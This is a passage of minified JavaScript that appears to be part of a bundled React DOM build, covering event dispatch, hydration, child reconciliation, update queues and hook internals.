e;if((v||h)&&(h=u.window===u?u:(h=u.ownerDocument)?h.defaultView||h.parentWindow:window,v?(k=t.relatedTarget||t.toElement,v=c,k=k?qn(k):null,k!==null&&(A=ot(k),k!==A||k.tag!==5&&k.tag!==6)&&(k=null)):(v=null,k=c),v!==k)){if(x=Oo,S="onMouseLeave",p="onMouseEnter",f="mouse",(e==="pointerout"||e==="pointerover")&&(x=Io,S="onPointerLeave",p="onPointerEnter",f="pointer"),A=v==null?h:gt(v),m=k==null?h:gt(k),h=new x(S,f+"leave",v,t,u),h.target=A,h.relatedTarget=m,S=null,qn(u)===c&&(x=new x(p,f+"enter",k,t,u),x.target=m,x.relatedTarget=A,S=x),A=S,v&&k)n:{for(x=v,p=k,f=0,m=x;m;m=ut(m))f++;for(m=0,S=p;S;S=ut(S))m++;for(;0<f-m;)x=ut(x),f--;for(;0<m-f;)p=ut(p),m--;for(;f--;){if(x===p||p!==null&&x===p.alternate)break n;x=ut(x),p=ut(p)}x=null}else x=null;v!==null&&Go(d,h,v,x,!1),k!==null&&A!==null&&Go(d,A,k,x,!0)}}e:{if(h=c?gt(c):window,v=h.nodeName&&h.nodeName.toLowerCase(),v==="select"||v==="input"&&h.type==="file")var T=Lf;else if(jo(h))if(Zu)T=Mf;else{T=Rf;var I=Nf}else(v=h.nodeName)&&v.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(T=Of);if(T&&(T=T(e,c))){Qu(d,T,t,u);break e}I&&I(e,h,c),e==="focusout"&&(I=h._wrapperState)&&I.controlled&&h.type==="number"&&ha(h,"number",h.value)}switch(I=c?gt(c):window,e){case"focusin":(jo(I)||I.contentEditable==="true")&&(ft=I,Ea=c,ds=null);break;case"focusout":ds=Ea=ft=null;break;case"mousedown":Ta=!0;break;case"contextmenu":case"mouseup":case"dragend":Ta=!1,Vo(d,t,u);break;case"selectionchange":if(zf)break;case"keydown":case"keyup":Vo(d,t,u)}var g;if(Pl)e:{switch(e){case"compositionstart":var b="onCompositionStart";break e;case"compositionend":b="onCompositionEnd";break e;case"compositionupdate":b="onCompositionUpdate";break e}b=void 0}else ht?Xu(e,t)&&(b="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(b="onCompositionStart");b&&(qu&&t.locale!=="ko"&&(ht||b!=="onCompositionStart"?b==="onCompositionEnd"&&ht&&(g=Yu()):(Cn=u,El="value"in Cn?Cn.value:Cn.textContent,ht=!0)),I=Br(c,b),0<I.length&&(b=new Mo(b,e,null,t,u),d.push({event:b,listeners:I}),g?b.data=g:(g=Ku(t),g!==null&&(b.data=g)))),(g=Ef?Tf(e,t):Cf(e,t))&&(c=Br(c,"onBeforeInput"),0<c.length&&(u=new Mo("onBeforeInput","beforeinput",null,t,u),d.push({event:u,listeners:c}),u.data=g))}op(d,n)})}function Ts(e,n,t){return{instance:e,listener:n,currentTarget:t}}function Br(e,n){for(var t=n+"Capture",s=[];e!==null;){var r=e,i=r.stateNode;r.tag===5&&i!==null&&(r=i,i=ws(e,t),i!=null&&s.unshift(Ts(e,i,r)),i=ws(e,n),i!=null&&s.push(Ts(e,i,r))),e=e.return}return s}function ut(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Go(e,n,t,s,r){for(var i=n._reactName,a=[];t!==null&&t!==s;){var l=t,o=l.alternate,c=l.stateNode;if(o!==null&&o===s)break;l.tag===5&&c!==null&&(l=c,r?(o=ws(t,i),o!=null&&a.unshift(Ts(t,o,l))):r||(o=ws(t,i),o!=null&&a.push(Ts(t,o,l)))),t=t.return}a.length!==0&&e.push({event:n,listeners:a})}var Uf=/\r\n?/g,Hf=/\u0000|\uFFFD/g;function Yo(e){return(typeof e=="string"?e:""+e).replace(Uf,`
`).replace(Hf,"")}function ir(e,n,t){if(n=Yo(n),Yo(e)!==n&&t)throw Error(P(425))}function Fr(){}var Ca=null,Pa=null;function Aa(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var La=typeof setTimeout=="function"?setTimeout:void 0,Vf=typeof clearTimeout=="function"?clearTimeout:void 0,qo=typeof Promise=="function"?Promise:void 0,Wf=typeof queueMicrotask=="function"?queueMicrotask:typeof qo<"u"?function(e){return qo.resolve(null).then(e).catch($f)}:La;function $f(e){setTimeout(function(){throw e})}function Gi(e,n){var t=n,s=0;do{var r=t.nextSibling;if(e.removeChild(t),r&&r.nodeType===8)if(t=r.data,t==="/$"){if(s===0){e.removeChild(r),xs(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=r}while(t);xs(n)}function On(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function Xo(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var Vt=Math.random().toString(36).slice(2),en="__reactFiber$"+Vt,Cs="__reactProps$"+Vt,fn="__reactContainer$"+Vt,Na="__reactEvents$"+Vt,Gf="__reactListeners$"+Vt,Yf="__reactHandles$"+Vt;function qn(e){var n=e[en];if(n)return n;for(var t=e.parentNode;t;){if(n=t[fn]||t[en]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=Xo(e);e!==null;){if(t=e[en])return t;e=Xo(e)}return n}e=t,t=e.parentNode}return null}function Vs(e){return e=e[en]||e[fn],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function gt(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(P(33))}function fi(e){return e[Cs]||null}var Ra=[],yt=-1;function Hn(e){return{current:e}}function X(e){0>yt||(e.current=Ra[yt],Ra[yt]=null,yt--)}function Y(e,n){yt++,Ra[yt]=e.current,e.current=n}var Fn={},ve=Hn(Fn),Te=Hn(!1),nt=Fn;function Ot(e,n){var t=e.type.contextTypes;if(!t)return Fn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var r={},i;for(i in t)r[i]=n[i];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=r),r}function Ce(e){return e=e.childContextTypes,e!=null}function Ur(){X(Te),X(ve)}function Ko(e,n,t){if(ve.current!==Fn)throw Error(P(168));Y(ve,n),Y(Te,t)}function up(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var r in s)if(!(r in n))throw Error(P(108,Lh(e)||"Unknown",r));return J({},t,s)}function Hr(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Fn,nt=ve.current,Y(ve,e),Y(Te,Te.current),!0}function Qo(e,n,t){var s=e.stateNode;if(!s)throw Error(P(169));t?(e=up(e,n,nt),s.__reactInternalMemoizedMergedChildContext=e,X(Te),X(ve),Y(ve,e)):X(Te),Y(Te,t)}var on=null,mi=!1,Yi=!1;function pp(e){on===null?on=[e]:on.push(e)}function qf(e){mi=!0,pp(e)}function Vn(){if(!Yi&&on!==null){Yi=!0;var e=0,n=G;try{var t=on;for(G=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}on=null,mi=!1}catch(r){throw on!==null&&(on=on.slice(e+1)),Du(bl,Vn),r}finally{G=n,Yi=!1}}return null}var vt=[],wt=0,Vr=null,Wr=0,De=[],ze=0,tt=null,cn=1,un="";function Gn(e,n){vt[wt++]=Wr,vt[wt++]=Vr,Vr=e,Wr=n}function dp(e,n,t){De[ze++]=cn,De[ze++]=un,De[ze++]=tt,tt=e;var s=cn;e=un;var r=32-qe(s)-1;s&=~(1<<r),t+=1;var i=32-qe(n)+r;if(30<i){var a=r-r%5;i=(s&(1<<a)-1).toString(32),s>>=a,r-=a,cn=1<<32-qe(n)+r|t<<r|s,un=i+e}else cn=1<<i|t<<r|s,un=e}function Ll(e){e.return!==null&&(Gn(e,1),dp(e,1,0))}function Nl(e){for(;e===Vr;)Vr=vt[--wt],vt[wt]=null,Wr=vt[--wt],vt[wt]=null;for(;e===tt;)tt=De[--ze],De[ze]=null,un=De[--ze],De[ze]=null,cn=De[--ze],De[ze]=null}var Ne=null,Le=null,K=!1,Ge=null;function hp(e,n){var t=je(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function Zo(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,Ne=e,Le=On(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,Ne=e,Le=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=tt!==null?{id:cn,overflow:un}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=je(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,Ne=e,Le=null,!0):!1;default:return!1}}function Oa(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Ma(e){if(K){var n=Le;if(n){var t=n;if(!Zo(e,n)){if(Oa(e))throw Error(P(418));n=On(t.nextSibling);var s=Ne;n&&Zo(e,n)?hp(s,t):(e.flags=e.flags&-4097|2,K=!1,Ne=e)}}else{if(Oa(e))throw Error(P(418));e.flags=e.flags&-4097|2,K=!1,Ne=e}}}function Jo(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Ne=e}function ar(e){if(e!==Ne)return!1;if(!K)return Jo(e),K=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Aa(e.type,e.memoizedProps)),n&&(n=Le)){if(Oa(e))throw fp(),Error(P(418));for(;n;)hp(e,n),n=On(n.nextSibling)}if(Jo(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(P(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){Le=On(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}Le=null}}else Le=Ne?On(e.stateNode.nextSibling):null;return!0}function fp(){for(var e=Le;e;)e=On(e.nextSibling)}function Mt(){Le=Ne=null,K=!1}function Rl(e){Ge===null?Ge=[e]:Ge.push(e)}var Xf=vn.ReactCurrentBatchConfig;function Qt(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(P(309));var s=t.stateNode}if(!s)throw Error(P(147,e));var r=s,i=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===i?n.ref:(n=function(a){var l=r.refs;a===null?delete l[i]:l[i]=a},n._stringRef=i,n)}if(typeof e!="string")throw Error(P(284));if(!t._owner)throw Error(P(290,e))}return e}function lr(e,n){throw e=Object.prototype.toString.call(n),Error(P(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function ec(e){var n=e._init;return n(e._payload)}function mp(e){function n(p,f){if(e){var m=p.deletions;m===null?(p.deletions=[f],p.flags|=16):m.push(f)}}function t(p,f){if(!e)return null;for(;f!==null;)n(p,f),f=f.sibling;return null}function s(p,f){for(p=new Map;f!==null;)f.key!==null?p.set(f.key,f):p.set(f.index,f),f=f.sibling;return p}function r(p,f){return p=zn(p,f),p.index=0,p.sibling=null,p}function i(p,f,m){return p.index=m,e?(m=p.alternate,m!==null?(m=m.index,m<f?(p.flags|=2,f):m):(p.flags|=2,f)):(p.flags|=1048576,f)}function a(p){return e&&p.alternate===null&&(p.flags|=2),p}function l(p,f,m,S){return f===null||f.tag!==6?(f=ea(m,p.mode,S),f.return=p,f):(f=r(f,m),f.return=p,f)}function o(p,f,m,S){var T=m.type;return T===dt?u(p,f,m.props.children,S,m.key):f!==null&&(f.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===bn&&ec(T)===f.type)?(S=r(f,m.props),S.ref=Qt(p,f,m),S.return=p,S):(S=Cr(m.type,m.key,m.props,null,p.mode,S),S.ref=Qt(p,f,m),S.return=p,S)}function c(p,f,m,S){return f===null||f.tag!==4||f.stateNode.containerInfo!==m.containerInfo||f.stateNode.implementation!==m.implementation?(f=na(m,p.mode,S),f.return=p,f):(f=r(f,m.children||[]),f.return=p,f)}function u(p,f,m,S,T){return f===null||f.tag!==7?(f=Jn(m,p.mode,S,T),f.return=p,f):(f=r(f,m),f.return=p,f)}function d(p,f,m){if(typeof f=="string"&&f!==""||typeof f=="number")return f=ea(""+f,p.mode,m),f.return=p,f;if(typeof f=="object"&&f!==null){switch(f.$$typeof){case Ks:return m=Cr(f.type,f.key,f.props,null,p.mode,m),m.ref=Qt(p,null,f),m.return=p,m;case pt:return f=na(f,p.mode,m),f.return=p,f;case bn:var S=f._init;return d(p,S(f._payload),m)}if(ss(f)||Gt(f))return f=Jn(f,p.mode,m,null),f.return=p,f;lr(p,f)}return null}function h(p,f,m,S){var T=f!==null?f.key:null;if(typeof m=="string"&&m!==""||typeof m=="number")return T!==null?null:l(p,f,""+m,S);if(typeof m=="object"&&m!==null){switch(m.$$typeof){case Ks:return m.key===T?o(p,f,m,S):null;case pt:return m.key===T?c(p,f,m,S):null;case bn:return T=m._init,h(p,f,T(m._payload),S)}if(ss(m)||Gt(m))return T!==null?null:u(p,f,m,S,null);lr(p,m)}return null}function v(p,f,m,S,T){if(typeof S=="string"&&S!==""||typeof S=="number")return p=p.get(m)||null,l(f,p,""+S,T);if(typeof S=="object"&&S!==null){switch(S.$$typeof){case Ks:return p=p.get(S.key===null?m:S.key)||null,o(f,p,S,T);case pt:return p=p.get(S.key===null?m:S.key)||null,c(f,p,S,T);case bn:var I=S._init;return v(p,f,m,I(S._payload),T)}if(ss(S)||Gt(S))return p=p.get(m)||null,u(f,p,S,T,null);lr(f,S)}return null}function k(p,f,m,S){for(var T=null,I=null,g=f,b=f=0,M=null;g!==null&&b<m.length;b++){g.index>b?(M=g,g=null):M=g.sibling;var N=h(p,g,m[b],S);if(N===null){g===null&&(g=M);break}e&&g&&N.alternate===null&&n(p,g),f=i(N,f,b),I===null?T=N:I.sibling=N,I=N,g=M}if(b===m.length)return t(p,g),K&&Gn(p,b),T;if(g===null){for(;b<m.length;b++)g=d(p,m[b],S),g!==null&&(f=i(g,f,b),I===null?T=g:I.sibling=g,I=g);return K&&Gn(p,b),T}for(g=s(p,g);b<m.length;b++)M=v(g,p,b,m[b],S),M!==null&&(e&&M.alternate!==null&&g.delete(M.key===null?b:M.key),f=i(M,f,b),I===null?T=M:I.sibling=M,I=M);return e&&g.forEach(function(F){return n(p,F)}),K&&Gn(p,b),T}function x(p,f,m,S){var T=Gt(m);if(typeof T!="function")throw Error(P(150));if(m=T.call(m),m==null)throw Error(P(151));for(var I=T=null,g=f,b=f=0,M=null,N=m.next();g!==null&&!N.done;b++,N=m.next()){g.index>b?(M=g,g=null):M=g.sibling;var F=h(p,g,N.value,S);if(F===null){g===null&&(g=M);break}e&&g&&F.alternate===null&&n(p,g),f=i(F,f,b),I===null?T=F:I.sibling=F,I=F,g=M}if(N.done)return t(p,g),K&&Gn(p,b),T;if(g===null){for(;!N.done;b++,N=m.next())N=d(p,N.value,S),N!==null&&(f=i(N,f,b),I===null?T=N:I.sibling=N,I=N);return K&&Gn(p,b),T}for(g=s(p,g);!N.done;b++,N=m.next())N=v(g,p,b,N.value,S),N!==null&&(e&&N.alternate!==null&&g.delete(N.key===null?b:N.key),f=i(N,f,b),I===null?T=N:I.sibling=N,I=N);return e&&g.forEach(function(B){return n(p,B)}),K&&Gn(p,b),T}function A(p,f,m,S){if(typeof m=="object"&&m!==null&&m.type===dt&&m.key===null&&(m=m.props.children),typeof m=="object"&&m!==null){switch(m.$$typeof){case Ks:e:{for(var T=m.key,I=f;I!==null;){if(I.key===T){if(T=m.type,T===dt){if(I.tag===7){t(p,I.sibling),f=r(I,m.props.children),f.return=p,p=f;break e}}else if(I.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===bn&&ec(T)===I.type){t(p,I.sibling),f=r(I,m.props),f.ref=Qt(p,I,m),f.return=p,p=f;break e}t(p,I);break}else n(p,I);I=I.sibling}m.type===dt?(f=Jn(m.props.children,p.mode,S,m.key),f.return=p,p=f):(S=Cr(m.type,m.key,m.props,null,p.mode,S),S.ref=Qt(p,f,m),S.return=p,p=S)}return a(p);case pt:e:{for(I=m.key;f!==null;){if(f.key===I)if(f.tag===4&&f.stateNode.containerInfo===m.containerInfo&&f.stateNode.implementation===m.implementation){t(p,f.sibling),f=r(f,m.children||[]),f.return=p,p=f;break e}else{t(p,f);break}else n(p,f);f=f.sibling}f=na(m,p.mode,S),f.return=p,p=f}return a(p);case bn:return I=m._init,A(p,f,I(m._payload),S)}if(ss(m))return k(p,f,m,S);if(Gt(m))return x(p,f,m,S);lr(p,m)}return typeof m=="string"&&m!==""||typeof m=="number"?(m=""+m,f!==null&&f.tag===6?(t(p,f.sibling),f=r(f,m),f.return=p,p=f):(t(p,f),f=ea(m,p.mode,S),f.return=p,p=f),a(p)):t(p,f)}return A}var It=mp(!0),gp=mp(!1),$r=Hn(null),Gr=null,kt=null,Ol=null;function Ml(){Ol=kt=Gr=null}function Il(e){var n=$r.current;X($r),e._currentValue=n}function Ia(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function Pt(e,n){Gr=e,Ol=kt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(_e=!0),e.firstContext=null)}function Fe(e){var n=e._currentValue;if(Ol!==e)if(e={context:e,memoizedValue:n,next:null},kt===null){if(Gr===null)throw Error(P(308));kt=e,Gr.dependencies={lanes:0,firstContext:e}}else kt=kt.next=e;return n}var Xn=null;function Dl(e){Xn===null?Xn=[e]:Xn.push(e)}function yp(e,n,t,s){var r=n.interleaved;return r===null?(t.next=t,Dl(n)):(t.next=r.next,r.next=t),n.interleaved=t,mn(e,s)}function mn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var xn=!1;function zl(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function vp(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function dn(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Mn(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,V&2){var r=s.pending;return r===null?n.next=n:(n.next=r.next,r.next=n),s.pending=n,mn(e,t)}return r=s.interleaved,r===null?(n.next=n,Dl(s)):(n.next=r.next,r.next=n),s.interleaved=n,mn(e,t)}function br(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,xl(e,t)}}function nc(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var r=null,i=null;if(t=t.firstBaseUpdate,t!==null){do{var a={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};i===null?r=i=a:i=i.next=a,t=t.next}while(t!==null);i===null?r=i=n:i=i.next=n}else r=i=n;t={baseState:s.baseState,firstBaseUpdate:r,lastBaseUpdate:i,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function Yr(e,n,t,s){var r=e.updateQueue;xn=!1;var i=r.firstBaseUpdate,a=r.lastBaseUpdate,l=r.shared.pending;if(l!==null){r.shared.pending=null;var o=l,c=o.next;o.next=null,a===null?i=c:a.next=c,a=o;var u=e.alternate;u!==null&&(u=u.updateQueue,l=u.lastBaseUpdate,l!==a&&(l===null?u.firstBaseUpdate=c:l.next=c,u.lastBaseUpdate=o))}if(i!==null){var d=r.baseState;a=0,u=c=o=null,l=i;do{var h=l.lane,v=l.eventTime;if((s&h)===h){u!==null&&(u=u.next={eventTime:v,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var k=e,x=l;switch(h=n,v=t,x.tag){case 1:if(k=x.payload,typeof k=="function"){d=k.call(v,d,h);break e}d=k;break e;case 3:k.flags=k.flags&-65537|128;case 0:if(k=x.payload,h=typeof k=="function"?k.call(v,d,h):k,h==null)break e;d=J({},d,h);break e;case 2:xn=!0}}l.callback!==null&&l.lane!==0&&(e.flags|=64,h=r.effects,h===null?r.effects=[l]:h.push(l))}else v={eventTime:v,lane:h,tag:l.tag,payload:l.payload,callback:l.callback,next:null},u===null?(c=u=v,o=d):u=u.next=v,a|=h;if(l=l.next,l===null){if(l=r.shared.pending,l===null)break;h=l,l=h.next,h.next=null,r.lastBaseUpdate=h,r.shared.pending=null}}while(!0);if(u===null&&(o=d),r.baseState=o,r.firstBaseUpdate=c,r.lastBaseUpdate=u,n=r.shared.interleaved,n!==null){r=n;do a|=r.lane,r=r.next;while(r!==n)}else i===null&&(r.shared.lanes=0);rt|=a,e.lanes=a,e.memoizedState=d}}function tc(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],r=s.callback;if(r!==null){if(s.callback=null,s=t,typeof r!="function")throw Error(P(191,r));r.call(s)}}}var Ws={},tn=Hn(Ws),Ps=Hn(Ws),As=Hn(Ws);function Kn(e){if(e===Ws)throw Error(P(174));return e}function jl(e,n){switch(Y(As,n),Y(Ps,e),Y(tn,Ws),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:ma(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=ma(n,e)}X(tn),Y(tn,n)}function Dt(){X(tn),X(Ps),X(As)}function wp(e){Kn(As.current);var n=Kn(tn.current),t=ma(n,e.type);n!==t&&(Y(Ps,e),Y(tn,t))}function Bl(e){Ps.current===e&&(X(tn),X(Ps))}var Q=Hn(0);function qr(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var qi=[];function Fl(){for(var e=0;e<qi.length;e++)qi[e]._workInProgressVersionPrimary=null;qi.length=0}var xr=vn.ReactCurrentDispatcher,Xi=vn.ReactCurrentBatchConfig,st=0,Z=null,oe=null,ue=null,Xr=!1,hs=!1,Ls=0,Kf=0;function me(){throw Error(P(321))}function Ul(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Ke(e[t],n[t]))return!1;return!0}function Hl(e,n,t,s,r,i){if(st=i,Z=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,xr.current=e===null||e.memoizedState===null?em:nm,e=t(s,r),hs){i=0;do{if(hs=!1,Ls=0,25<=i)throw Error(P(301));i+=1,ue=oe=null,n.updateQueue=null,xr.current=tm,e=t(s,r)}while(hs)}if(xr.current=Kr,n=oe!==null&&oe.next!==null,st=0,ue=oe=Z=null,Xr=!1,n)throw Error(P(300));return e}function Vl(){var e=Ls!==0;return Ls=0,e}function Je(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return ue===null?Z.memoizedState=ue=e:ue=ue.next=e,ue}function Ue(){if(oe===null){var e=Z.alternate;e=e!==null?e.memoizedState:null}else e=oe.next;var n=ue===null?Z.memoizedState:ue.next;if(n!==null)ue=n,oe=e;else{if(e===null)throw Error(P(310));oe=e,e={memoizedState:oe.memoizedState,baseState:oe.baseState,baseQueue:oe.baseQueue,queue:oe.queue,next:null},ue===null?Z.memoizedState=ue=e:ue=ue.next=e}return ue}function Ns(e,n){return typeof n=="function"?n(e):n}function Ki(e){var n=Ue(),t=n.queue;if(t===null)throw Error(P(311));t.lastRenderedReducer=e;var s=oe,r=s.baseQueue,i=t.pending;if(i!==null){if(r!==null){var a=r.next;r.next=i.next,i.next=a}s.baseQueue=r=i,t.pending=null}if(r!==null){i=r.next,s=s.baseState;var l=a=null,o=null,c=i;do{var u=c.lane;if((st&u)===u)o!==null&&(o=o.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),s=c.hasEagerState?c.eagerState:e(s,c.action);else{var d={lane:u,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};o===null?(l=o=d,a=s):o=o.next=d,Z.lanes|=u,rt|=u}c=c.next}while(c!==null&&c!==i);o===null?a=s:o.next=l,Ke(s,n.memoizedState)||(_e=!0),n.memoizedState=s,n.baseState=a,n.baseQueue=o,t.lastRenderedState=s}if(e=t.interleaved,e!==null){r=e;do i=r.lane,Z.lanes|=i,rt|=i,r=r.next;while(r!==e)}else r===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function Qi(e){var n=Ue(),t=n.queue;if(t===null)throw Error(P(311));t.lastRenderedReducer=e;var s=t.dispatch,r=t.pending,i=n.memoizedState;if(r!==null){t.pending=null;var a=r=r.next;do i=e(i,a.action),a=a.next;while(a!==r);Ke(i,n.memoizedState)||(_e=!0),n.memoizedState=i,n.baseQueue===null&&(n.baseState=i),t.lastRenderedState=i}return[i,s]}function kp(){}function bp(e,n){var t=Z,s=Ue(),r=n(),i=!Ke(s.memoizedState,r);if(i&&(s.memoizedState=r,_e=!0),s=s.queue,Wl(_p.bind(null,t,s,e),[e]),s.getSnapshot!==n||i||ue!==null&&ue.memoizedState.tag&1){if(t.flags|=2048,Rs(9,Sp.bind(null,t,s,r,n),void 0,null),pe===null)throw Error(P(349));st&30||xp(t,n,r)}return r}function xp(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=Z.updateQueue,n===null?(n={lastEffect:null,stores:null},Z.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Sp(e,n,t,s){n.value=t,n.getSnapshot=s,Ep(n)&&Tp(e)}function _p(e,n,t){return t(function(){Ep(n)&&Tp(e)})}function Ep(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Ke(e,t)}catch{return!0}}function Tp(e){var n=mn(e,1);n!==null&&Xe(n,e,1,-1)}function sc(e){var n=Je();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Ns,lastRenderedState:e},n.queue=e,e=e.dispatch=Jf.bind(null,Z,e),[n.memoizedState,e]}function Rs(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=Z.updateQueue,n===null?(n={lastEffect:null,stores:null},Z.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function Cp(){return Ue().memoizedState}function Sr(e,n,t,s){var r=Je();Z.flags|=e,r.memoizedState=Rs(1|n,t,void 0,s===void 0?null:s)}function gi(e,n,t,s){var r=Ue();s=s===void 0?null:s;var i=void 0;if(oe!==null){var a=oe.memoizedState;if(i=a.destroy,s!==null&&Ul(s,a.deps)){r.memoizedState=Rs(n,t,i,s);return}}Z.flags|=e,r.memoizedState=Rs(1|n,t,i,s)}function rc(e,n){return Sr(8390656,8,e,n)}function Wl(e,n){return gi(2048,8,e,n)}function Pp(e,n){return gi(4,2,e,n)}function Ap(e,n){return gi(4,4,e,n)}function Lp(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Np(e,n,t){return t=t!=null?t.concat([e]):null,gi(4,4,Lp.bind(null,n,e),t)}function $l(){}function Rp(e,n){var t=Ue();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Ul(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function Op(e,n){var t=Ue();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Ul(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function Mp(e,n,t){return st&21?(Ke(t,n)||(t=Bu(),Z.lanes|=t,rt|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,_e=!0),e.memoizedState=t)}function Qf(e,n){var t=G;G=t!==0&&4>t?t:4,e(!0);var s=Xi.transition;Xi.transition={};try{e(!1),n()}finally{G=t,Xi.transition=s}}function Ip(){return Ue().memoizedState}function Zf(e,n,t){var s=Dn(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},Dp(e))zp(n,t);else if(t=yp(e,n,t,s),t!==null){var r=ke();Xe(t,e,s,r),jp(t,n,s)}}function Jf(e,n,t){var 